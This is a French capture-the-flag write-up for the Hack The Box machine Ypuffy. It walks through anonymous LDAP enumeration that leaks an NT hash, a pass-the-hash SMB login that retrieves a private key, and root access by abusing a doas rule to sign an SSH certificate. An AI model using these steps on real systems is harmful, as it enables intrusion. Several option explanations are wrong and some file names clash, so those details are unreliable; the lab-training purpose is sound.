# Ypuffy writeups by Seyptoo.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/06/4/1549540617-capture-du-2019-02-07-12-56-48.png)](https://hackthebox.eu/)

Informations
----
    Ip : 10.10.10.107       Created by : AuxSarge
    Level : Easy            Base Points : 30
    
Nmap Scan
----
    Nmap scan report for 10.10.10.107
    Host is up (0.044s latency).
    Not shown: 995 closed ports
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
    |_  256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
    80/tcp  open  http        OpenBSD httpd
    |_http-server-header: OpenBSD httpd
    139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: YPUFFY)
    389/tcp open  ldap        (Anonymous bind OK)
    445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: YPUFFY)

    Host script results:
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.7.6)
    |   Computer name: ypuffy
    |   NetBIOS computer name: YPUFFY
    |   Domain name: hackthebox.htb
    |   FQDN: ypuffy.hackthebox.htb
    |_  System time: 2019-02-07T07:02:05-05:00
    | smb-security-mode: 
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smbv2-enabled: Server supports SMBv2 protocol
    
Comme vous pouvez le voir nous avons 5 ports, le SSH (22), HTTP (80), Samba (139), LDAP pour l'active directory (389) et enfin le 445 pour le Samba.

Donc au niveau du protocole LDAP on peut voir que on peut se connecter en tant que [Anonymous](https://ldapwiki.com/wiki/Anonymous%20bind) nous allons énumérer ce protocole de plus près.

LDAP
----

LDAP : Lightweight Directory Access Protocol est à l'origine un protocole permettant l'interrogation et la modification des services d'annuaire. Ce protocole repose sur TCP/IP. Une explication simple et efficace.

    root@seyptoo-Aspire-E5-721:~/htb/writeup/YPuffy# locate *.nse |grep ldap
    /usr/share/nmap/scripts/ldap-brute.nse
    /usr/share/nmap/scripts/ldap-novell-getpass.nse
    /usr/share/nmap/scripts/ldap-rootdse.nse
    /usr/share/nmap/scripts/ldap-search.nse

Utilisons le script **ldap-search.nse**, la commande est tapé juste ci-dessous. 

**nmap -p 389 --script ldap-search -oA nmap/ldap-output-file 10.10.10.107**

    |   Context: dc=hackthebox,dc=htb
    |     dn: dc=hackthebox,dc=htb
    |         dc: hackthebox
    |         objectClass: top
    |         objectClass: domain
    |     dn: ou=passwd,dc=hackthebox,dc=htb
    |         ou: passwd
    |         objectClass: top
    |         objectClass: organizationalUnit
    |     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
    |         uid: bob8791
    |         cn: Bob
    |         objectClass: account
    |         objectClass: posixAccount
    |         objectClass: top
    |         userPassword: {BSDAUTH}bob8791
    |         uidNumber: 5001
    |         gidNumber: 5001
    |         gecos: Bob
    |         homeDirectory: /home/bob8791
    |         loginShell: /bin/ksh
    |     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
    |         uid: alice1978
    |         cn: Alice
    |         objectClass: account
    |         objectClass: posixAccount
    |         objectClass: top
    |         objectClass: sambaSamAccount
    |         userPassword: {BSDAUTH}alice1978
    |         uidNumber: 5000
    |         gidNumber: 5000
    |         gecos: Alice
    |         homeDirectory: /home/alice1978
    |         loginShell: /bin/ksh
    |         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
    |         displayName: Alice
    |         sambaAcctFlags: [U          ]
    |         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
    |         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
    |         sambaPwdLastSet: 1532916644
    |     dn: ou=group,dc=hackthebox,dc=htb
    |         ou: group
    |         objectClass: top
    |         objectClass: organizationalUnit
    |     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
    |         objectClass: posixGroup
    |         objectClass: top
    |         cn: bob8791
    |         userPassword: {crypt}*
    |         gidNumber: 5001
    |     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
    |         objectClass: posixGroup
    |         objectClass: top
    |         cn: alice1978
    |         userPassword: {crypt}*
    |         gidNumber: 5000
    |     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
    |         sambaDomainName: YPUFFY
    |         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
    |         sambaAlgorithmicRidBase: 1000
    |         objectclass: sambaDomain
    |         sambaNextUserRid: 1000
    |         sambaMinPwdLength: 5
    |         sambaPwdHistoryLength: 0
    |         sambaLogonToChgPwd: 0
    |         sambaMaxPwdAge: -1
    |         sambaMinPwdAge: 0
    |         sambaLockoutDuration: 30
    |         sambaLockoutObservationWindow: 30
    |         sambaLockoutThreshold: 0
    |         sambaForceLogoff: -1
    |         sambaRefuseMachinePwdChange: 0
    |_        sambaNextRid: 1001

Nous avons beaucoup d'informations comme on peut le voir il y'a 2 utilisateurs **alice1978** et **bob8791**, nous avons aussi des noms de domaine, le shell utilisé est ksh.

Nous avons aussi un mot de passe **sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B**, c'est un mot de passe chiffré en NTLM donc il y'a une option sur le programme smbclient pour se connecter grâce au hash NTLM.
L'options est : --pw-nt-hash.

Samba
----
    root@seyptoo-Aspire-E5-721:~/htb/writeup/YPuffy/www# smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash \\\\10.10.10.107\\alice
    WARNING: The "syslog" option is deprecated
    Domain=[YPUFFY] OS=[Windows 6.1] Server=[Samba 4.7.6]
    smb: \> ls
      .                                   D        0  Tue Jul 31 04:54:20 2018
      ..                                  D        0  Fri Feb  8 18:43:55 2019
      my_private_key.ppk                  A     1460  Tue Jul 17 03:38:51 2018

                    433262 blocks of size 1024. 411514 blocks available

Utilisé la commande **mget** pour transférer le fichier dans votre machine physique afin de faire de la manipulation avec ce fichier.

    smb: \> mget my_private_key.ppk
    Get file my_private_key.ppk? y
    getting file \my_private_key.ppk of size 1460 as my_private_key.ppk (7,7 KiloBytes/sec) (average 7,7 KiloBytes/sec)
    smb: \>
    
Une fois que la transfert à été effectué avec succès nous devons convertir ce fichier en clé RSA avec la commande puttygen rien de compliqué pour la conversion.

Shell > User.txt
----
Donc la commande à utilisé est puttygen si vous n'avez pas ce logiciel dans votre système vous avez juste a installer avec la commande **apt-get install putty-tools** ou bien manuellement.

    root@seyptoo-Aspire-E5-721:~/htb/writeup/YPuffy/www# puttygen *.ppk -O private-openssh -o id_dsa
    
Ensuite vous tapez la commande ci-dessous.

    root@seyptoo-Aspire-E5-721:~/htb/writeup/YPuffy/www# chmod 600 id_rsa

Et vous pouvez effectuer la connexion grâce à la clé SSH.

    root@seyptoo-Aspire-E5-721:~/htb/writeup/YPuffy/www# ssh -i id_dsa alice1978@10.10.10.107
    OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

    Welcome to OpenBSD: The proactively secure Unix-like operating system.

    Please use the sendbug(1) utility to report bugs in the system.
    Before reporting a bug, please try to reproduce it with the latest
    version of the code.  With bug reports, please try to ensure that
    enough information to reproduce the problem is enclosed, and if a
    known fix for it exists, include that as well.

    ypuffy$ ls
    ssh-ca   user.txt windir
    ypuffy$ wc -c user.txt
        33 user.txt
        
 PrivEsc
 ----
Donc après avoir chercher pendant un certain temps j'ai trouver un fichier qui comporte du SUID, donc tapez la commande juste ci-dessous.

    ypuffy$ find / -user root -perm -4000 -print 2>/dev/null 
    [...SNIP...]
    /usr/bin/doas
    [...SNIP...]

Donc si nous regardons le fichier de configuration dans /etc/doas.conf il y'a des informations à la ligne 2.

    permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
    
Donc concrètement comme vous pouvez le voir, l'utilisateur alice1978 n'est pas obligé de taper un mot de passe lors de la connexion en SSH. Donc nous allons essayer de générer une clé RSA et de changer ça signature avec la commande doas.
D'abord nous devons créer un dossier dans **/tmp** vous pouvez le crée ou voulais bien evidamment.

    ypuffy$ mkdir /tmp/.root

Après avoir créer le dossier, nous devons changer les permissions.

    ypuffy$ chmod 777 /tmp/.root
    ypuffy$ cd /tmp/.root
    
Ensuite nous allons générer une clé RSA avec la commande **ssh-keygen**.

    ypuffy$ ssh-keygen

Nous allons ensuite copier ce fichier avec la commande **cp**.

    ypuffy$ cp /home/alice1978/.ssh/id_rsa* .
    
Nous allons utilisé la commande doas pour changer la signature. Tapez la commande ci-dessous.

    /usr/bin/doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I user_alice1978 -n 3m3rgencyB4ckd00r -V +52w id_rsa
    
L'option -u : 'Permet de spécifier l'utilisateur'<br />
L'option -s : 'Exécutez le shell à partir de SHELL ou de /etc/passwd.'<br />
L'option -I : 'L'expédition du fichier de configuration.'<br />
L'option -n : 'Mode non interactif, échouez si les doas demandent un mot de passe.'<br />
L'option -V : 'L'expiration, donc +52w = 1 an.'<br />

Donc ensuite vous avez juste à chmod le fichier et a vous connectez en tant que root :

    ypuffy$ chmod 600 id_rsa                                                                                                                                            
    ypuffy$ ssh -i id_rsa root@localhost                                                                                
    OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

    Welcome to OpenBSD: The proactively secure Unix-like operating system.

    Please use the sendbug(1) utility to report bugs in the system.
    [...SNIP...]

    ypuffy# cd /root/
    ypuffy# wc -c root.txt
        33 root.txt
